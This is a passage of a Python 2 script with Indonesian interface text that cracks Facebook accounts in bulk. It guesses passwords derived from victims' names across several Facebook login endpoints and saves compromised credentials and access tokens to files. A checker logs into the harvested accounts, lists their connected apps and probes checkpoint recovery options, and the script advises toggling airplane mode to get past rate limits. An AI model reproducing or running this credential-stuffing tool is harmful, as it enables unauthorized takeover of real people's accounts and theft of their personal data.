            if "c_user" in ses.cookies.get_dict().keys():
            	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print ('\r %s+--> %s | %s | %s   ' % (H,user,pw,response.json()['access_token']))
                wrt = '%s|%s|%s ' % (user,pw,response.json()['access_token'])
                ok.append(wrt)
                open('dapet/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue
            elif "checkpoint" in ses.cookies.get_dict().keys():
                try:
                    jeeckxd = open('data/token.txt').read()
                    lahir = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,jeeckxd)).json()['birthday']
                    month, day, year = lahir.split('/')
                    month = bulan1[month]
                    print '\r %s+--> %s | %s | %s %s %s ' % (K,user,pw,day,month,year)
                    wrt = '%s|%s|%s %s %s' % (user,pw,day,month,year)
                    cp.append(wrt)
                    open('dapet/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                except KeyError:
                    day = ''
                    month   = ''
                    year  = ''
                except: pass
                print '\r %s+--> %s | %s           ' % (K,user,pw)
                wrt = '%s|%s' % (user,pw)
                cp.append(wrt)
                open('dapet/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue
        loop += 1
        print("\r %s[%s+++-----%s] %s--%s [OK-->%s]----++[CP-->%s]"%(P,B,P,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()


        loop += 1
        loop += 1
    def crack(self):
        print("%s | "%(B))
        ff = raw_input("%s[•] Input : "%(p))
        if ff == '':
            print("[•] Isi dengan benar celeng ");menu()
        elif ff in ('1', '01'):
            print("%s | "%(B))
            print("%s[•] Hasil crack %s OK %sdi simpan di file %s+--)%s OK-%s-%s-%s.txt"%(p,b,p,b,p,ha,op,ta))
            print("[•] Hasil crack %s CP %sdi simpan di file %s+--)%s CP-%s-%s-%s.txt"%(B,p,b,p,ha,op,ta))
            print("%s[•] %sJika crack sudah melebihi 500 aktifkan mode pesawat 1 kali"%(p,b))
            with celeng(max_workers=30) as crack:
            	for uh in self.id: 
                    try:
                        uid, name = uh.split('<=>')
                        i = name.split(' ')
                        if len(i) == 3 or len(i) == 4 or len(i) == 5 or len(i) == 6:
                            pwx = [name, i[0]+"123", i[0]+"12345"]
                        else:
                            pwx = [name, i[0]+"123", i[0]+"12345"]
                        crack.submit(self.api, uid, pwx)
                    except:
                        pass
            os.remove(self.apk)
            print("%s[•] Crack berhenti"%(m));exit()
        elif ff in ('2', '02'):
            print("%s | "%(B))
            print("%s[•] Hasil crack %s OK %sdi simpan di file %s+--)%s OK-%s-%s-%s.txt"%(p,b,p,b,p,ha,op,ta))
            print("[•] Hasil crack %s CP %sdi simpan di file %s+--)%s CP-%s-%s-%s.txt"%(B,p,b,p,ha,op,ta))
            print("%s[•] %sJika crack sudah melebihi 500 aktifkan mode pesawat"%(p,b))
            with celeng(max_workers=30) as crack:
            	for uh in self.id: 
                    try:
                        uid, name = uh.split('<=>')
                        i = name.split(' ')
                        if len(i) == 3 or len(i) == 4 or len(i) == 5 or len(i) == 6:
                            pwx = [name, i[0]+"123", i[0]+"12345"]
                        else:
                            pwx = [name, i[0]+"123", i[0]+"12345"]
                        crack.submit(self.mbasic, uid, pwx)
                    except:
                        pass
            os.remove(self.apk)
            print("%s[•] Crack berhenti"%(m));exit()
        elif ff in ('3', '03'):
            print("%s | "%(B))
            print("%s[•] Hasil crack %s OK %sdi simpan di file %s+--)%s OK-%s-%s-%s.txt"%(p,b,p,b,p,ha,op,ta))
            print("[•] Hasil crack %s CP %sdi simpan di file %s+--)%s CP-%s-%s-%s.txt"%(B,p,b,p,ha,op,ta))
            print("%s[•] %sJika crack sudah melebihi 500 aktifkan mode pesawat 1 kali"%(p,b))
            with celeng(max_workers=30) as crack:
            	for uh in self.id: 
                    try:
                        uid, name = uh.split('<=>')
                        i = name.split(' ')
                        if len(i) == 3 or len(i) == 4 or len(i) == 5 or len(i) == 6:
                            pwx = [name, i[0]+"123", i[0]+"12345"]
                        else:
                            pwx = [name, i[0]+"123", i[0]+"12345"]
                        crack.submit(self.mobile, uid, pwx)
                    except:
                        pass
            os.remove(self.apk)
            exit("\n%s%s finished "%(H,til))
        else:
            print '\n%s%s isi yang benar'%(M,til);self.crack()
### CEK FILE
def cek_file():
    dirs = os.listdir("dapet")
    for peli in dirs:
        print("%s[•] %s____/---> %s%s "%(P,K,B,peli))
    try:
    	print("%s[•] Pilih yang ingin di chek "%(P)) 
        print("%s[•] Masukan file contoh %s dapet/%s"%(P, B,peli))
    except NameError:
        print("%s[•] File tidak di temukan / anda belum crack :( "%(m)) 
###  CEK OPSI :(
def cek_opsi():
    print("%s | "%(B))
    file = raw_input("%s[•] Masukan file : %s"%(P,b))
    if file == '':
        print("%s[•] Isi dengan benar"%(m));exit()
    try:
        self = open(file, 'r').readlines()
    except IOError:
        print("%s[•] File tidak di temukan"%(m));exit()

    print("%s[•] Total account : %s%s"%(P,b,len(self)))
    for yes in self:
        fl = yes.replace('\n', '')
        ya = fl.split('|')
        print '\n\033[0;00m[\033[0;36m•\033[0;00m]\033[0;33m Proses pengecekan :\033[0;36m ' + fl.replace(' + ', '')
        
        try:
            check_in(ya[0].replace(' + ', ''), ya[1])
        except requests.exceptions.ConnectionError:
            print("%s[•] Tidak ada koneksi"%(m));exit()
            continue
    print("%s[•] Proses telah berhenti "%(B));exit()


def check_in(user, pasw):
    mb = 'https://mbasic.facebook.com'
    ua = 'Android 4.0 Blackberry - Mozilla Firefox 8.0'
    ses = requests.Session()
    ses.headers.update({
        'Host': 'mbasic.facebook.com',
        'cache-control': 'max-age=0',
        'upgrade-insecure-requests': '1',
        'origin': mb,
        'content-type': 'application/x-www-form-urlencoded',
        'user-agent': ua,
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'x-requested-with': 'mark.via.gp',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-user': '?1',
        'sec-fetch-dest': 'document',
        'referer': mb + '/login/?next&ref=dbl&fl&refid=8',
        'accept-encoding': 'gzip, deflate',
        'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' })
    data = { }
    ged = parser(ses.get(mb + '/login/?next&ref=dbl&fl&refid=8', headers = {
        'user-agent': ua }).text, 'html.parser')
    fm = ged.find('form', {
        'method': 'post' })
    list = [
        'lsd',
        'jazoest',
        'm_ts',
        'li',
        'try_number',
        'unrecognized_tries',
        'login',
        'bi_xrwh']
    for i in fm.find_all('input'):
        if i.get('name') in list:
            data.update({
                i.get('name'): i.get('value') })
            continue
            continue
    data.update({
        'email': user,
        'pass': pasw })
    run = parser(ses.post(mb + fm.get('action'), data = data, allow_redirects = True).text, 'html.parser')
    if 'c_user' in ses.cookies:
        kuki = ';'.join([ '%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items() ])
        run = parser(ses.get('https://free.facebook.com/settings/apps/tabbed/', cookies = {
            'cookie': kuki }).text, 'html.parser')
        xe = [ re.findall('\\<span.*?href=".*?">(.*?)<\\/a><\\/span>.*?\\<div class=".*?">(.*?)<\\/div>', str(td)) for td in run.find_all('td', {
            'aria-hidden': 'false' }) ][2:]
        print("%s[•] Aplikasi terhubung : %s%s"%(p,b,str(len(xe))))
        num = 0
        for _ in xe:
            num += 1
       #     print '  \033[0;00m[\033[0;36m' + str(num) + '\033[0;00m]\033[0;36m ' + _[0][0] + '\033[0;00m,\033[0;36m ' + _[0][1]
            print '  \033[0;00m[\033[0;36m' + str(num) + '\033[0;00m]\033[0;36m ' + _[0][0] + '\033[0;00m,\033[0;36m ' + _[0][1]
        
    elif 'checkpoint' in ses.cookies:
        form = run.find('form')
        dtsg = form.find('input', {
            'name': 'fb_dtsg' })['value']
        jzst = form.find('input', {
            'name': 'jazoest' })['value']
        nh = form.find('input', {
            'name': 'nh' })['value']
        dataD = {
            'fb_dtsg': dtsg,
            'fb_dtsg': dtsg,
            'jazoest': jzst,
            'jazoest': jzst,
            'checkpoint_data': '',
            'submit[Continue]': 'Lanjutkan',
            'nh': nh }
        parr = parser(ses.post(mb + form['action'], data = dataD).text, 'html.parser')
        proo = [ yy.text for yy in parr.find_all('option') ]
        jalan("%s[•] terdapat %s[%s]%s opsi "%(P,B,str(len(proo)),p))
        for opt in range(len(proo)):
    #        jalan '  \033[0;33m[\033[0;36m' + str(opt + 1) + '\033[0;33m]\033[0;00m ' + proo[opt]
            print '  \033[0;33m[\033[0;36m' + str(opt + 1) + '\033[0;33m]\033[0;00m ' + proo[opt]
    elif 'login_error' in str(run):
        oh = run.find('div', {
            'id': 'login_error' }).find('div').text
        jalan("%s%s"%(k,oh))
    else:
        jalan("%s[•] Kemungkinan password telah dinganti"%(m))


#### BUAT FOLLDER
def folder():
	try:os.mkdir('dump')
	except:pass
	try:os.mkdir('dapet')
	except:pass
	try:os.mkdir('data')
	except:pass

if __name__ == '__main__':
    os.system('git pull')
    folder()
    menu()
